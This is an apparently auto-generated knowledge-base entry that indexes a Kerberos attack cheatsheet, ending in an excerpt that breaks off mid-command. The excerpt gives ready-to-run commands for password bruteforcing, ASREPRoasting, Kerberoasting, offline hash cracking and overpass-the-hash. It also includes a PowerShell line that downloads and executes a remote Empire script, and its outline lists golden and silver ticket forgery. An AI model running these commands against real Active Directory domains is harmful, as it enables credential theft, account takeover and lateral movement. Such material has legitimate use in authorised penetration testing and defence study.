---
title: "Trained Knowledge & Topology: kerberos_attacks_cheatsheet.md"
tags:
  - credential_access
  - enumeration
  - hashcat
  - https
  - impacket
  - john
  - kerberos
  - lateral_movement_routing_pivot
  - mdp
  - mimikatz
  - powershell
  - sysinternals
  - text
  - trained
source_file: kerberos_attacks_cheatsheet.md
doc_type: text
updated: 2026-10-25 00:58:45
---

# Trained Knowledge & Architecture: `kerberos_attacks_cheatsheet.md`

- **Source Path:** `~/Projects/CORA/Training/kerberos_attacks_cheatsheet.md` (`text`)
- **Extracted Technical Entities:** `hashcat, https, impacket, john, kerberos, mimikatz, powershell, sysinternals`
- **Extracted IPs / Subnets:** `None`
- **Extracted Interfaces:** `None`
- **Linked Command Playbook:** [[commands/trained_kerberos_attacks_cheatsheet]] (`35` CEGAR-verified commands | `35` MDP transitions)

## Command & Tactic Coverage Summary
- **Total CEGAR-Verified Commands:** `35` (full executable list in [[commands/trained_kerberos_attacks_cheatsheet]])
- **Tactic Distribution:** `Credential_Access` (30), `Lateral_Movement_Routing_Pivot` (3), `Enumeration` (2)
- **Top Extracted CLI Tools:** `python` (17), `mimikatz` (8), `export` (3), `hashcat` (2), `john` (2), `grep` (1), `iex` (1), `invoke-kerberoast` (1)

## Document Structure & Key Topics
- Kerberos cheatsheet
- Bruteforcing
- with a list of users
- check passwords for all users in current domain
- ASREPRoast
- check ASREPRoast for all domain users (credentials required)
- check ASREPRoast for a list of users (no credentials required)
- check ASREPRoast for all users in current domain
- Kerberoasting
- Overpass The Hash/Pass The Key (PTK)
- Request the TGT with hash
- Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
- Request the TGT with password
- If not provided, password is asked
- Set the TGT for impacket use
- Execute remote commands with any of the following by using the TGT
- Ask and inject the ticket
- Execute a cmd in the remote machine
- Pass The Ticket (PTT)
- Harvest tickets from Linux
- To dump current user tickets, if root, try to dump them all by injecting in other user processes
- to inject, copy tickey in a reachable folder by all users
- Harvest tickets from Windows
- After dump with Rubeus tickets in base64, to write the in a file
- Using ticket in Linux:
- Set the ticket for impacket use
- Using ticket in Windows
- Silver ticket
- To generate the TGS with NTLM
- To generate the TGS with AES key
- To generate the TGS with AES 128 key
- To generate the TGS with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
- Inject TGS with Mimikatz
- Golden ticket
- To generate the TGT with NTLM
- To generate the TGT with AES key
- To generate the TGT with AES 128 key
- To generate the TGT with AES 256 key (more secure encryption, probably more stealth due is the used by default by Microsoft)
- Inject TGT with Mimikatz
- Misc
- Tools

## Extracted Reference Excerpt
# Kerberos cheatsheet

## Bruteforcing

With [kerbrute.py](https://github.com/TarlogicSecurity/kerbrute):
```shell
python kerbrute.py -domain <domain_name> -users <users_file> -passwords <passwords_file> -outputfile <output_file>
```

With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
```shell
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```

## ASREPRoast

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetNPUsers.py:
```shell
# check ASREPRoast for all domain users (credentials required)
python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>

# check ASREPRoast for a list of users (no credentials required)
python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
```

With [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
# check ASREPRoast for all users in current domain
.\Rubeus.exe asreproast  /format:<AS_REP_responses_format [hashcat | john]> /outfile:<output_hashes_file>
```

Cracking with dictionary of passwords:
```shell
hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>

john --wordlist=<passwords_file> <AS_REP_responses_file>
```


## Kerberoasting

With [Impacket](https://github.com/SecureAuthCorp/impacket) example GetUserSPNs.py:
```shell
python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>
```


With [Rubeus](https://github.com/GhostPack/Rubeus):
```shell
.\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
```

With **Powershell**:
```
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat <TGSs_format [hashcat | john]> | % { $_.Hash } | Out-File -Encoding ASCII <output_TGSs_file>
```

Cracking with dictionary of passwords:
```shell
hashcat -m 13100 --force <TGSs_file> <passwords_file>

john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>
```


## Overpass The Hash/Pass The Key (PTK)

By using [Impacket](https://github.com/SecureAuthCorp/impacket) examples:
```shell
# Request the TGT with hash
python getTGT.py <domain_name>/<user_name> -hashes [lm_hash]:<ntlm_hash>
# Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
python getTGT.py <domain_name>/<user_name> -aesKey <aes_key>
# Reque

